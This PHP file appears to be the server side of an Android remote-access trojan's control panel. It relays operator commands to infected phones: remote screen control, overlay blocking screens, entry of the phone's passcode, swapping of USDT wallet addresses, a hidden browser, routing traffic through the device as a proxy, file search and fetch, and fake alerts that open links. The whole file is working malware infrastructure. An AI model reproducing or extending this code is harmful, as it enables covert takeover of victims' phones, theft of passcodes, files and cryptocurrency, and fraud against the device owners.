<?php

declare(strict_types=1);

namespace App\WebSocket\Handlers;

use App\WebSocket\ConnectionManager;
use App\WebSocket\Handlers\Concerns\AuthorizesDeviceAccess;
use App\WebSocket\Messages\WebSocketMessage;
use App\WebSocket\Services\DeviceStatusService;
use App\WebSocket\Services\LastPingFormatter;
use App\WebSocket\WebSocketLog;

final class PanelHandler
{
    use AuthorizesDeviceAccess;

    public function __construct(
        private readonly ConnectionManager $connectionManager,
        private readonly DeviceStatusService $deviceStatusService
    ) {}

    public function handle(int $fd, WebSocketMessage $message): void
    {
        $phoneId = $this->authorizeDeviceAccess($fd, $message, $this->connectionManager);
        if ($phoneId === null) {
            return;
        }

        $subc = $message->subc();

        match ($subc) {
            'join' => $this->handleJoin($fd, $phoneId),
            'out' => $this->handleOut($phoneId),
            'ping' => $this->handlePing($fd, $phoneId),
            'disag' => $this->handleDisag($phoneId),
            'screen' => $this->handleScreenCommand($phoneId, $message),
            'brows' => $this->handleBrowserCommand($phoneId, $message),
            'proxy' => $this->handleProxyCommand($phoneId, $message),
            'fetch' => $this->handleFetchCommand($phoneId, $message),
            'bc' => $this->handleBroadcastCommand($phoneId, $message),
            'srch' => $this->handleSearchCommand($phoneId, $message),
            'cocu' => $this->handleCopyCommand($phoneId, $message),
            'chat' => $this->handleChatCommand($phoneId, $message),
            default => $this->forwardToDevice($phoneId, $message),
        };
    }

    private function handleJoin(int $fd, string $phoneId): void
    {
        $this->connectionManager->registerPanel($fd, $phoneId);
        $this->logOperation('mov_connect', $phoneId);

        $this->connectionManager->send($fd, $this->buildStatusBatchPayload($phoneId));
    }

    private function handleOut(string $phoneId): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'out',
        ]);
    }

    private function handlePing(int $fd, string $phoneId): void
    {
        $this->connectionManager->send($fd, $this->buildStatusBatchPayload($phoneId));
    }

    private function buildStatusBatchPayload(string $phoneId): array
    {
        $phoneInfo = $this->deviceStatusService->formatForPanel($phoneId);
        $isOnline = $this->connectionManager->isDeviceOnline($phoneId);
        $lastPing = LastPingFormatter::format($phoneInfo['lastPing'] ?? null);

        return [
            'type' => 'statusBatch',
            'pid' => $phoneId,
            'serverToPhone' => $this->connectionStatusLabel($isOnline),
            'lastPing' => $lastPing,
            'phoneInfo' => $phoneInfo,
        ];
    }

    private function handleDisag(string $phoneId): void
    {
        $fd = $this->connectionManager->getDeviceFd($phoneId);

        if ($fd !== null) {
            $this->connectionManager->getServer()->close($fd);
        }
    }

    private function handleScreenCommand(string $phoneId, WebSocketMessage $message): void
    {
        $command = $message->getString('comand');

        $this->logScreenCommand($phoneId, $command, $message);

        $deviceData = match ($command) {
            'block' => [
                'type' => 'screen',
                'subc' => 'block',
                'blockstate' => $message->getString('bstate', '0'),
                'color' => $message->getString('color'),
            ],
            'paste' => [
                'type' => 'screen',
                'subc' => 'paste',
                'txt' => $message->getString('txt'),
            ],
            'mov' => [
                'type' => 'screen',
                'subc' => 'mov',
                'poi' => $message->get('poi', ''),
                'movetype' => $message->getString('movetype'),
            ],
            'snap' => [
                'type' => 'screen',
                'subc' => 'snap',
                'snaptype' => $message->getString('stype', '1'),
            ],
            'vol' => [
                'type' => 'screen',
                'subc' => 'vol',
                'volstate' => $message->getString('volstate', '0'),
            ],
            'kb' => [
                'type' => 'screen',
                'subc' => 'kb',
                'kbstate' => $message->getString('kbstate', '0'),
            ],
            'L' => [
                'type' => 'screen',
                'subc' => 'L',
                'lock' => $message->getString('lockit', '0'),
            ],
            'nav' => [
                'type' => 'screen',
                'subc' => 'nav',
                'nav' => $message->getString('navshort'),
            ],
            'q' => [
                'type' => 'screen',
                'subc' => 'Q',
                'newq' => $message->getString('newqulity'),
            ],
            'phonepass' => [
                'type' => 'screen',
                'subc' => 'phonepass',
                'passtype' => $message->getString('passtype'),
                'phonepass' => $message->getString('txt'),
            ],
            'usdt' => [
                'type' => 'screen',
                'subc' => 'usdt',
                'usdttype' => $message->getString('usdttype'),
            ],
            'usdtadress' => [
                'type' => 'screen',
                'subc' => 'usdtadress',
                'usdtadresstext' => $message->getString('usdtadresstext'),
            ],
            'blockd' => [
                'type' => 'screen',
                'subc' => 'blockd',
                'blocktext' => $message->getString('blocktext'),
            ],
            default => [
                'type' => 'screen',
                'subc' => $command,
            ],
        };

        $this->connectionManager->sendToDevice($phoneId, $deviceData);
    }

    private function handleBrowserCommand(string $phoneId, WebSocketMessage $message): void
    {
        $btype = $message->getString('btype', 'n');
        $this->logOperation("browser:{$btype}", $phoneId);

        // Node.js: h=hidden browser, n=normal browser - different field structures
        $deviceData = match ($btype) {
            'h' => [
                'type' => 'brows',
                'subc' => 'h',
                'bcom' => $message->getString('bcom'),      // 0=stop, 1=start, 3=command
                'extdata' => $message->get('extdata'),
            ],
            'n' => [
                'type' => 'brows',
                'subc' => 'n',
                'ltype' => $message->getString('ltype'),    // f=html base64, u=url
                'extdata' => $message->get('extdata'),
            ],
            default => null,
        };

        if ($deviceData !== null) {
            $this->connectionManager->sendToDevice($phoneId, $deviceData);
        }
    }

    private function handleProxyCommand(string $phoneId, WebSocketMessage $message): void
    {
        $prxcom = $message->getString('prxcom');
        $this->logOperation("proxy:{$prxcom}", $phoneId);

        // Convert ON/OFF to 1/0 as per Node.js protocol
        $subc = match ($prxcom) {
            'ON' => '1',
            'OFF' => '0',
            default => null,
        };

        if ($subc === null) {
            return;
        }

        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'proxy',
            'subc' => $subc,
        ]);
    }

    private function handleFetchCommand(string $phoneId, WebSocketMessage $message): void
    {
        $this->logOperation('fetch', $phoneId);
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'fetch',
            'ftype' => $message->getString('ftype'),
            'fpath' => $message->getString('fpath'),
        ]);
    }

    private function handleBroadcastCommand(string $phoneId, WebSocketMessage $message): void
    {
        $command = $message->getString('comand');
        $action = $message->getString('act');
        $this->logOperation("broadcast:{$command}", $phoneId);

        // Map action string to number as per Node.js protocol
        $actionNum = match ($action) {
            'nothing' => '0',
            'openApp' => '1',
            'openLink' => '2',
            default => null,
        };

        if ($actionNum === null) {
            return;
        }

        $baseData = [
            'type' => 'bc',
            'thetitle' => $message->getString('title'),
            'themsg' => $message->getString('msg'),
            'toopen' => $message->getString('todo'),
            'theype' => $actionNum,
        ];

        $deviceData = match ($command) {
            'alert' => array_merge($baseData, [
                'subc' => 'A',
                'ico' => $message->getString('alertico'),
            ]),
            'notify' => array_merge($baseData, [
                'subc' => 'N',
            ]),
            default => null,
        };

        if ($deviceData !== null) {
            $this->connectionManager->sendToDevice($phoneId, $deviceData);
        }
    }

    private function handleSearchCommand(string $phoneId, WebSocketMessage $message): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'srch',
            'srchfor' => $message->getString('srchfor'),
            'srchin' => $message->getString('srchin'),
            'targetpath' => $message->getString('targetpath'),
        ]);
    }

    private function handleCopyCommand(string $phoneId, WebSocketMessage $message): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'cocu',
            'state' => $message->getString('state'),
            'tp' => $message->getString('tp'),
            'fp' => $message->getString('fp'),
        ]);
    }

    private function handleChatCommand(string $phoneId, WebSocketMessage $message): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'chat',
            'msg' => $message->getString('msg'),
            'title' => $message->getString('title'),
        ]);
    }

    private function connectionStatusLabel(bool $isOnline): string
    {
        return $isOnline ? 'OPEN' : 'CLOSED';
    }

    private function forwardToDevice(string $phoneId, WebSocketMessage $message): void
    {
        $deviceData = array_merge($message->toArray(), ['type' => 'screencomd']);
        unset($deviceData['itype'], $deviceData['pid']);

        $this->connectionManager->sendToDevice($phoneId, $deviceData);
    }

    private function logScreenCommand(string $phoneId, string $command, WebSocketMessage $message): void
    {
        if (! config('websocket.logging.enabled', true)) {
            return;
        }

        $context = ['phone_id' => $phoneId, 'comand' => $command];

        $context = match ($command) {
            'mov' => array_merge($context, [
                'movetype' => $message->getString('movetype'),
                'poi' => is_array($message->get('poi'))
                    ? json_encode($message->get('poi'))
                    : $message->getString('poi'),
            ]),
            'nav' => array_merge($context, [
                'navshort' => $message->getString('navshort'),
            ]),
            'vol' => array_merge($context, [
                'volstate' => $message->getString('volstate'),
            ]),
            'kb' => array_merge($context, [
                'kbstate' => $message->getString('kbstate'),
            ]),
            'paste' => array_merge($context, [
                'txt_length' => strlen($message->getString('txt')),
            ]),
            'L' => array_merge($context, [
                'lockit' => $message->getString('lockit'),
            ]),
            'q' => array_merge($context, [
                'quality' => $message->getString('newqulity'),
            ]),
            default => $context,
        };

        WebSocketLog::getLogger()->info('Panel screen command', $context);
    }

    private function logOperation(string $logType, string $phoneId): void
    {
        if (! config('websocket.logging.enabled', true)) {
            return;
        }

        WebSocketLog::getLogger()->info("Operation: {$logType}", [
            'phone_id' => $phoneId,
        ]);
    }
}
